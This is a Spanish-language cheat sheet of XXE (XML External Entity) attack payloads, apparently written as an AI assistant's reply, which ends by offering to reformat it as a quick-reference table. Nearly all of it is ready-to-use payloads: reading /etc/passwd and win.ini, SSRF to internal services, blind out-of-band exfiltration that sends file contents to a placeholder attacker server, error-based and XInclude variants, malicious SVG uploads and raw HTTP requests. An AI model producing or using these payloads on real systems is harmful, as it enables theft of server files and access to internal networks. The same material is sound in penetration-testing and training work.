
# Diccionario de Payloads XXE

---

## 1. Lectura de Archivos Locales

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
````

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<data>&xxe;</data>
```

---

## 2. SSRF (Server-Side Request Forgery)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-service.local/secret"> ]>
<data>&xxe;</data>
```

---

## 3. Blind XXE (Exfiltración Out-of-Band)

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://OUR-SERVER.com/?data=%file;'>">
  %eval;
  %exfil;
]>
```

```xml
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://OUR-SERVER.com/evil.dtd">
  %remote;
]>
```

*(el archivo `evil.dtd` alojado en nuestro servidor puede contener la lógica de exfiltración)*

---

## 4. Error-Based XXE

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY fail SYSTEM "file:///does/not/exist/%xxe;">
]>
<foo>&fail;</foo>
```

---

## 5. XInclude (cuando DOCTYPE está bloqueado)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

---

## 6. XXE en Archivos Subidos (ejemplo SVG)

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg height="100" width="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://OUR-SERVER.com/xxe">
]>
<svg height="100" width="100">
  <text x="10" y="20">&xxe;</text>
</svg>
```

---

## 7. Forzando Content-Type

```
POST /api HTTP/1.1
Host: vulnerable.com
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data>&xxe;</data>
```

```
POST /api HTTP/1.1
Host: vulnerable.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/"> ]>
<data>&xxe;</data>
```

---


¿Quieres que te lo prepare también en **formato tabla de referencia rápida** (Payload → Objetivo → Ejemplo) para que lo tengas todo en una sola vista compacta?
```
